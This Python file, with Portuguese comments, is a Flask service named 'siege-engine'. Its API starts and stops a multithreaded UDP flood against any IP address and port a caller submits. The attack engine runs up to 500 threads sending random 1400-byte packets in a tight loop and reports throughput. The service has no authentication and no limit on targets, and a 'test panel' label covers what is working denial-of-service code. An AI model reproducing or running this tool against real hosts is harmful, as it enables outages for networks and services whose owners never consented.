import os
import time
import socket
import struct
import logging
import threading
from datetime import datetime, timezone
from flask import Flask, jsonify, request
from flask_cors import CORS

# ──────────────────────────────────────────────
# CONFIGURAÇÃO
# ──────────────────────────────────────────────
class Config:
    HOST = os.getenv("ENGINE_HOST", "0.0.0.0")
    PORT = int(os.getenv("ENGINE_PORT", "8080"))
    DEFAULT_THREADS = int(os.getenv("DEFAULT_THREADS", "50"))
    MAX_THREADS = int(os.getenv("MAX_THREADS", "500"))
    BURST_SIZE = int(os.getenv("BURST_SIZE", "1400"))
    LOG_LEVEL = os.getenv("LOG_LEVEL", "INFO")

cfg = Config()

logging.basicConfig(
    level=getattr(logging, cfg.LOG_LEVEL, logging.INFO),
    format="%(asctime)s [%(levelname)s] %(name)s: %(message)s",
    datefmt="%H:%M:%S",
)
log = logging.getLogger("siege-engine")

# ──────────────────────────────────────────────
# MÉTRICAS (Thread-Safe)
# ──────────────────────────────────────────────
class Metrics:
    def __init__(self):
        self._lock = threading.Lock()
        self.bytes_sent = 0
        self.packets_sent = 0
        self.start_time: float | None = None
        self.stop_time: float | None = None
        self.peak_mbps = 0.0
        self._window: list[tuple[float, int]] = []  # (timestamp, bytes)

    def record(self, n_bytes: int, n_packets: int = 1):
        with self._lock:
            self.bytes_sent += n_bytes
            self.packets_sent += n_packets
            now = time.monotonic()
            self._window.append((now, n_bytes))
            # Mantém janela de 5 segundos
            cutoff = now - 5.0
            self._window = [(t, b) for t, b in self._window if t >= cutoff]
            current_rate = (sum(b for _, b in self._window) * 8) / 5.0 / 1_000_000
            self.peak_mbps = max(self.peak_mbps, current_rate)

    def snapshot(self) -> dict:
        with self._lock:
            now = time.monotonic()
            window = [(t, b) for t, b in self._window if t >= now - 5.0]
            current_mbps = (sum(b for _, b in window) * 8) / 5.0 / 1_000_000 if window else 0.0
            uptime = (now - self.start_time) if self.start_time else 0.0
            return {
                "bytes_sent": self.bytes_sent,
                "packets_sent": self.packets_sent,
                "current_mbps": round(current_mbps, 2),
                "peak_mbps": round(self.peak_mbps, 2),
                "uptime_seconds": round(uptime, 1),
                "is_active": self.start_time is not None
            }

    def reset(self):
        with self._lock:
            self.bytes_sent = 0
            self.packets_sent = 0
            self.start_time = None
            self.stop_time = None
            self.peak_mbps = 0.0
            self._window = []

metrics = Metrics()

# ──────────────────────────────────────────────
# MOTOR DE ATAQUE
# ──────────────────────────────────────────────
class AttackEngine:
    def __init__(self):
        self._stop_event = threading.Event()
        self._active = False
        self._threads = []
        self._target_ip = None
        self._target_port = None
        self._threads_count = 0
        self._lock = threading.Lock()

    def start(self, target_ip: str, target_port: int, num_threads: int = None) -> tuple[bool, str]:
        with self._lock:
            if self._active:
                return False, "Ataque já está em andamento."
            
            self._stop_event.clear()
            self._target_ip = target_ip
            self._target_port = target_port
            self._threads_count = min(num_threads or cfg.DEFAULT_THREADS, cfg.MAX_THREADS)
            self._active = True
            metrics.start_time = time.monotonic()
            
            for i in range(self._threads_count):
                t = threading.Thread(target=self._worker, args=(i,), daemon=True)
                t.start()
                self._threads.append(t)
            
            log.info(f"ATAQUE INICIADO: {target_ip}:{target_port} ({self._threads_count} threads)")
            return True, f"Ataque iniciado em {target_ip}:{target_port} com {self._threads_count} threads."

    def stop(self) -> tuple[bool, str]:
        with self._lock:
            if not self._active:
                return False, "Nenhum ataque em andamento."
            
            self._stop_event.set()
            self._active = False
            metrics.stop_time = time.monotonic()
            
            for t in self._threads:
                t.join(timeout=2)
            self._threads = []
            
            log.info("ATAQUE PARADO")
            return True, "Ataque parado com sucesso."

    def _worker(self, thread_id: int):
        # Socket não-bloqueante
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setblocking(False)
        
        # Payload "Realista": Magic number + dados aleatórios
        header = struct.pack(">IHH", 0x53494547, thread_id % 65535, 0)
        payload = header + os.urandom(cfg.BURST_SIZE - len(header))
        
        while not self._stop_event.is_set():
            try:
                sock.sendto(payload, (self._target_ip, self._target_port))
                metrics.record(len(payload), 1)
            except (OSError, BlockingIOError):
                # Buffer do kernel cheio
                time.sleep(0.001)
            except Exception as e:
                log.error(f"Worker {thread_id} erro: {e}")
                break
        
        sock.close()

    def status(self) -> dict:
        with self._lock:
            return {
                "active": self._active,
                "target_ip": self._target_ip,
                "target_port": self._target_port,
                "threads": self._threads_count if self._active else 0,
                "metrics": metrics.snapshot()
            }

engine = AttackEngine()

# ──────────────────────────────────────────────
# APLICAÇÃO FLASK
# ──────────────────────────────────────────────
app = Flask(__name__)
CORS(app)

@app.get("/")
def home():
    return jsonify({
        "service": "siege-engine",
        "status": "online",
        "message": "Painel de testes funcionando",
        "version": "2.0"
    })

@app.get("/api/health")
def health():
    return jsonify({
        "status": "ok",
        "timestamp": datetime.now(timezone.utc).isoformat()
    })

@app.get("/api/status")
def status():
    return jsonify(engine.status())

@app.get("/api/metrics")
def get_metrics():
    return jsonify(metrics.snapshot())

@app.get("/api/config")
def get_config():
    return jsonify({
        "default_threads": cfg.DEFAULT_THREADS,
        "max_threads": cfg.MAX_THREADS,
        "burst_size": cfg.BURST_SIZE,
        "port": cfg.PORT
    })

@app.post("/api/attack")
def start_attack():
    data = request.get_json()
    target_ip = data.get("ip", "").strip()
    target_port = int(data.get("port", 11000))
    threads = int(data.get("threads", cfg.DEFAULT_THREADS))
    
    # Validação de IP
    try:
        socket.inet_aton(target_ip)
    except socket.error:
        return jsonify({"status": "error", "message": "IP inválido"}), 400
    
    if not (1 <= target_port <= 65535):
        return jsonify({"status": "error", "message": "Porta inválida"}), 400
    
    success, message = engine.start(target_ip, target_port, threads)
    return jsonify({"status": "ok" if success else "error", "message": message}), 200 if success else 409

@app.post("/api/attack/stop")
def stop_attack():
    success, message = engine.stop()
    return jsonify({"status": "ok" if success else "error", "message": message}), 200 if success else 409

if __name__ == "__main__":
    log.info(f"Iniciando Siege Engine em {cfg.HOST}:{cfg.PORT}")
    app.run(host=cfg.HOST, port=cfg.PORT, threaded=True)
